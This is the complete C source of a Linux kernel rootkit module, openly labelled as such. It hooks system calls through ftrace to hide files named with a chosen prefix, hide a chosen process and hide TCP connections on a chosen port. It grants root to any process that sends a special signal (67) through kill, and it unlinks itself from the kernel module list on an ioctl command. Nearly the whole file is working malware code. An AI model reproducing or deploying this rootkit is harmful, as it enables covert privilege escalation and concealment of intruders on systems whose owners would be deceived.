#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/version.h>

/* For character device */
#include <linux/ioctl.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
/* -------------------- */

// dirent == directory entry
#include <linux/dirent.h>

#include <net/inet_sock.h>

#include "ftrace_helper.h"

#define PREFIX "gabbagoo"
#define PREFIX_LEN sizeof(PREFIX) - 1

// IOCTL Codes
#define HIDE_PORT _IOW('a', 23, int *)
#define HIDE_MOD _IO('a', 24)
#define SHOW_MOD _IO('a', 25)

// Function Prototypes
static long rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

static char hide_pid[8 + 1] = {0};
static int hidden_port = 0;

static struct list_head *prev_module = NULL;
static int hidden = 0;

dev_t dev = 0;
static struct class *dev_class;
static struct cdev rootkit_cdev;

// File Ops struct for char device
const struct file_operations f_ops = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
};

asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
	    /* Get userspace dirent struct from pt_regs */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Declare our kernel direct struct and offset */
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_kern = NULL;
    unsigned long offset = 0;

    /* Error value */
    long error;

    /* Call real getdents64 and alloc our dirent struct */
    int ret = orig_getdents64(regs);

    if (ret <= 0)
        return ret;

    dirent_kern = kzalloc(ret, GFP_KERNEL);

    if (dirent_kern == NULL)
        return ret;

    /* Copy dirent from userspace into our kernel dirent */
    error = copy_from_user(dirent_kern, dirent, ret);
    if (error)
        goto done;
    
    /* Mess with directory entries */
    while (offset < ret) {

        current_dir = (void *)dirent_kern + offset;

        if (memcmp(PREFIX, current_dir->d_name, PREFIX_LEN) == 0) 
        {
            pr_info("Found %s\n", current_dir->d_name);
            if (current_dir == dirent_kern) 
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            } 
            
            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else if (strncmp(hide_pid, "", NAME_MAX) != 0 && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) 
        {
            pr_info("Found PID: %s\n", current_dir->d_name);
            if (current_dir == dirent_kern) 
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            } 
            
            previous_dir->d_reclen += current_dir->d_reclen;
        } 
        else 
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    /* Copy data back */
    error = copy_to_user(dirent, dirent_kern, ret);

done:
    kfree(dirent_kern);
    return ret;
}

asmlinkage long hook_kill(struct pt_regs *regs)
{
	pid_t pid = regs->di; // RDI
	int signal = regs->si; // RSI

	if (signal == 67)
	{
		memset(hide_pid, 0, 8);
		snprintf(hide_pid, 8, "%d", pid);

		pr_info("Elevating PID(%d) to root and hiding the process\n", pid);

		commit_creds(prepare_kernel_cred(0));

		return 0;
	}

	// If not our special signal, operate normally
	return orig_kill(regs);
}

// tcp4_seq_show hook
asmlinkage int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    struct inet_sock *inet;

    if (v == SEQ_START_TOKEN)
        return orig_tcp4_seq_show(seq, v);
    
    inet = inet_sk(sk);

    // I'm just gonna ignore kernel version edge cases
    if (ntohs(inet->inet_dport) == hidden_port)// || inet->inet_daddr == daddr) {
        return 0;

    pr_info("d_port = %d\n", ntohs(inet->inet_dport));

    return orig_tcp4_seq_show(seq, v);
}

// Hooks designated functions using ftrace
static struct ftrace_hook hooks[] = {
    {"tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show},
    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("sys_kill", hook_kill, &orig_kill),
};

void hide_me(void)
{
    if (hidden)
        return;

    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

void show_me(void)
{
    if (!hidden)
        return;
    
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
}

static long rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    switch (cmd)
    {
        case HIDE_PORT: // _IOW('a', 23, int)
            pr_info("HIDE_PORT IOCTL hit!!\n");
            if (copy_from_user((void *)&hidden_port, (void *)arg, 4) == 4)
                pr_info("Successful read from userspace!\n");
            break;
        case HIDE_MOD: // _IO('a', 24)
            hide_me();
            break;
        case SHOW_MOD: // _IO('a', 25)
            show_me();
            break;
        default:
            pr_err("Invalid IOCTL code: %d\n", cmd);
            break;
    }

    return 0;
}

// Module Init function - executed on module load (insmod)
static int __init load(void)
{
	int ret = 0;

	pr_info("rootkits are cool!\n");
	ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));

    if (ret != 0)
    {
        pr_err("Ftrace install failed!!\n");
        return ret;
    }

    // Let's create the character device
    if (alloc_chrdev_region(&dev, 0, 1, "rootkit") < 0)
    {
        pr_err("Cant get region\n");
        return -1;
    }

    pr_info("Major = %d, Minor = %d\n", MAJOR(dev), MINOR(dev));

    cdev_init(&rootkit_cdev, &f_ops);

    if (cdev_add(&rootkit_cdev, dev, 1) < 0)
    {
        pr_err("Cant add char device\n");
        goto class_free;
    }

    if(IS_ERR(dev_class = class_create(THIS_MODULE, "rootkit")))
    {
        pr_err("Cant create the device :(\n");
        goto device_free;
    }

	return ret;

device_free:
    class_destroy(dev_class);

class_free:
    cdev_del(&rootkit_cdev);
    unregister_chrdev_region(dev, 1);

    return -1;
}

// Module Exit function - executed on module unload (rmmod)
static void __exit unload(void)
{
	pr_info("Goodbye cruel world ;(\n");
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

    device_destroy(dev_class, dev);
    class_destroy(dev_class);
    cdev_del(&rootkit_cdev);
    unregister_chrdev_region(dev, 1);
}

module_init(load);
module_exit(unload);

// Licensing and other required shenanigans
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Oreomeister");
MODULE_DESCRIPTION("Totally not sus");
MODULE_VERSION("1.0");